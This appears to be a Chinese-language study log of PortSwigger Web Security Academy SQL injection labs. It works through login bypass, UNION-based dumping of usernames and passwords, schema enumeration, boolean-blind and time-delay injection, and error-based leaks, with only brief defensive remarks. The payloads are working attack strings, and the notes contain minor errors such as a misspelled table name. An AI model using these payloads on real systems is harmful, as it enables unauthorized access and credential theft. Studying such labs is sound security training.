#PortSwigger Web Security Academy:SQL Injection
##关卡一：SQL injection vulnerability in WHERE clause allowing retrieval of hidden data（寻找隐藏数据）
**目标**：利用SQL注入漏洞，让电商网站显示原本隐藏的商品
**漏洞发现**：点击商品分类时，URL为https://0a4f00e204f0621c825e20a500c800ce.web-security-academy.net/filter?category=Gifts猜测后端查询为SELECT * FROM products WHERE category = 'Gifts' AND released = 1
**攻击Payload**:Gifts ' OR 1=1 --
**原理**：'(单引号)：闭合后端原本字符串，使前面的查询条件完整【条件闭合】
         OR 1=1：构造绝对正确的条件。OR或者，不管分类是什么，都会打印所有数据【欺骗以便拉取所用有数据】
         --：将SQL后续所有内容注释【告诉数据库到这就可以了】
**防御**：使用参数化查询(预编译)JAVA中用PreparedStatement PHP中用PDO，避免字符串直接拼接【预判hack的预判】

##关卡二：SQL injection vulnerability allowing login bypass（允许登录绕过）
**目标**：在不知道管理员密码的前提下，以管理员administrator身份成功登录系统【拿着管理员的牌子蒙混过关】
**漏洞发现**：目标是一个登录框，后端查询大概为SELECT * FROM users WHERE username='输入' AND password='输入'
**攻击Payload**:用户名：administrator'--
                密码：随便
**原理**：利用'(单引号)闭合用户名参数
         利用--注释密码验证
         数据库只验证了用户名直接放行
**个人思考**：为什么用户名必须administrator而不是admin，原因：数据库中没有admin

##总结
红队：注意信息收集，注意URL
蓝队：预判攻击者的预判，在编写代码时使用安全性更高的

##关卡三：SQL injection attack, querying the database type and version on MySQL and Microsoft（MYSQL数据库版本查看）
**目标**：利用SQL注入查询MYSQL版本
**解决方案**：1.确定返回数量列数以及包含哪些文本数据：使用'union+select+'abc','def'#（官方解析）/ORDER BY 1-- -【探路小兵，看看有几列】，UNION SELECT 1,2 -- -【找显示位】
             2.输入攻击Payload:'+UNION+SELECT+@@version,+NULL#（官方解析）/'UNION SELECT @@version,NULL -- -'
**原理**：'(单引号)闭合后端SQL准备好的SQL语句【依旧闭合】
          UNION SELECT:SQL联合查询语句【粘合剂】
          @@version:系统内置全局变量【版本号提取】
          ，NULL：占位
          -- -：--单行注释符，-确保有空格
**扩展**：MYSQL：@@version/version()
         Oracle:v$version/banner【很强】
         PostgreSQL:version()

##关卡四：SQL injection attack, querying the database type and version on Oracle（Oracle数据库版本查看）
**目标**：拿到Oracle版本
**攻击Payload**:'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
**原理**：'(单引号)：闭合
          +代替空格
          UNION SELECT 数据库查询语句
          BANNER，v$version：Oracle数据库的版本查询语句
          NULL占位
          FROM来自哪
**思考与总结**：1.Oracle：必须有FROM，没有写dual(虚拟表)
               2.对数据类型要求很严格（'+UNION+SELECT+'abc','def'+FROM+dual--利用这一条测试）
               3.查版本用v$version

##总结
1.数据库常用查询SELECT ...FROM..
2.--注释符，#也可以，但是它在URL编码中会出问题
3.总的来说套路一致：首先现用单引号闭合，测数据库中表的列数，查想要的数据，最后注释

##关卡五：SQL injection UNION attack, retrieving data from other tables（联合注入）
**目标**：拿到管理员用户名，密码
**攻击Payload**:1.'+UNION+SELECT+'abc','def'--
                2.'+UNION+SELECT+username,+password+FROM+users--
                3.查看网页中administrator以及这个参数下面包含的字符串也就是密码
**思考与总结**：采用数字注入报错，题目要求username,password属于字符串类型
               FROM查什么地方的表

##关卡六：SQL injection UNION attack, finding a column containing text（查包含文本的列）
**目标**：让字符串出现在查询结果里
**攻击Payload**:1.'+UNION+SELECT+NULL,NULL,NULL--
                2.'+UNION+SELECT+'abcdef',NULL,NULL--(官方答案)
**实际**：1.采用ORDER BY 1 -- -【查看有几列】尝试到4时报错，证明一共3列
          2.' UNION SELECT 1,2,3-- -报错，数字行不通
          3.使用'+UNION+SELECT+NULL,NULL,NULL--和'+UNION+SELECT+'abcdef',NULL,NULL--
          4.'+UNION+SELECT+'abcdef',NULL,NULL--在第一位报错证明回显位不在第一位，换到第二位，成功找到字符串，复制放到第二回显位

##关卡七：SQL injection UNION attack, determining the number of columns returned by the query（测数列）
**目标**：察看数据库列数
**攻击payload**:1.' ORDER BY 1 -- -使用这一条看看有多少回显位（到3一共三个回显位）
                2.' UNION SELECT NULL,NULL,NULL -- -
                
##关卡八：SQL injection UNION attack, retrieving multiple values in a single column（强制拼接）
**目标**：在只有一个回显位的情况下，拿到管理员用户名，密码
**攻击payload**:1.'+UNION+SELECT+NULL,'abc'--
                2.'+UNION+SELECT+NULL,username||'~'||password+FROM+users--【挤挤】
**原理**：||Oracle,PostgreSQL字符串拼接符【强力520】
          CONCAT（）:MYSQL专用
          GROUP_CONCAT:将查出来的数据揉成一行

##总结：在只有一个回显位可用时需要将多个拼接为一个【挤挤总能放的下】

##关卡九：SQL injection attack, listing the database contents on non-Oracle databases
**目标**：拿到非Oracle数据库里的用户名，密码
**攻击payload**:1.'+UNION+SELECT+'abc','def'--查看是否有回显位
                2.'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--查所有表名
                3.'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--查所有列名
                4.'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--拿下管理员密码
**原理**：1.'table_name':表名
          2.'column_table':查列
          3.'information_schema':数据库自带系统信息库

##关卡十：SQL injection attack, listing the database contents on Oracle
**目标**：拿到Oracle数据库里的用户名，密码
**攻击payload**:1.'+UNION+SELECT+'abc','def'+FROM+dual--
                2.'+UNION+SELECT+table_name,NULL+FROM+all_tables--
                3.'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
                4.'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
**原理**：1.同上，Oracle数据库要求更高，必须说明从哪里查'dual'
          2.Oracle数据库用'all_tables','all_tab_columns'

##总结：要拿到数据库里的用户名，密码，必须按数据库的规则来，先查所有表【看看都叫什么】，再查列【找到目标表，查列，看看这个表里有什么】，最后将列和表结合按数据库的规矩来【毕竟是人家的地盘】

##关卡十：Blind SQL injection with conditional responses（盲注，数据库只会回答是或不是需要靠猜）
**目标**：拿到管理员密码
**攻击**：1.采用BP抓包，抓一段请求报文（Reuest），在请求报文中包含了Payload,cookie(登陆凭证),将其发送到Repeater
          2.在抓获的请求报文里找到Cookie:TrackingId=     Session=    ,在TrackingId的值后面加上'AND 1=1 -- -，点击Send，在返回报文中查找是否含有Welcome Back!
          3.将payload替换' AND 1=2 -- -,点击Send，查看是否有Welcome Back!
          4.确认完成后，替换payload为'AND (SELECT 'x' FROM users WHERE username='administrator')='x' -- -,点击Send，返回Welcome Back!证明用户存在
          5.替换Payload为' AND (SELECT LENGTH(password) FROM uers WHERE username='administrator')=20 -- -,如果出现Welcome Back!证明密码长度为20，如果没有就继续尝试
          6.猜到长度后开始一位一位爆破，建议写一个Python脚本，BP也可以，也可以采用kali自带工具SQLmap（使用麻烦，速度慢）
            BP使用：将请求发送给Intruder,找到之前的payload改为：'AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='？' -- -,？处就是你要猜字母或数字,长度最长的就是              找的密码
          7.等到密码爆破成功，登录即可（用户名为administrator）
**原理**：1.'LENGTH()'确认长度
          2.'SUBSTRING（string,position,length）':逐字提取，每次提取一个字符

##总结：盲注就是在数据库无法直接爆出密码时，采用‘逼问’的方式进行【只能猜】，好消息可以自动化完成【python脚本自动化】

##关卡十一：Blind SQL injection with time delays【让数据库睡一会】
**目标**：让数据库沉默一会儿
**攻击payload**:1.采用BP抓包，找到cookie部分
                2.找到TrackingId=x添加'||pg_sleep(10)--
**原理**：1.'(分号)闭合前面数据库语句
          2.||拼接符
          3.pg_sleep(10):让数据库罚站10秒
          4.--注释

##关卡十二：Visible error-based SQL injection【错误可视化，逼问的时候说漏了】
**目标**：拿下管理员密码
**攻击payload**：1.TrackingId=ogAZZfxtOKUELbuJ'【闭合尝试】
                 2.TrackingId=ogAZZfxtOKUELbuJ'--【注释尝试】
                 3.TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--【引入CAST语句】，报错AND语句有问题
                 4.TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--【修改使AND语句可用】
                 5.TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--【语句过长】
                 6.TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--【删除多余】
                 7.TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--【可行，套出管理员】
                 8.TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--【套出密码】
**原理**：1.'(单引号)闭合前面数据库语句
          2.`1=CAST(值 AS int)` 是一个比较表达式，满足 AND 的语法要求。
          3.SELECT password FROM users：数据库查询语句
          4.LIMIT 1:限制仅有一行







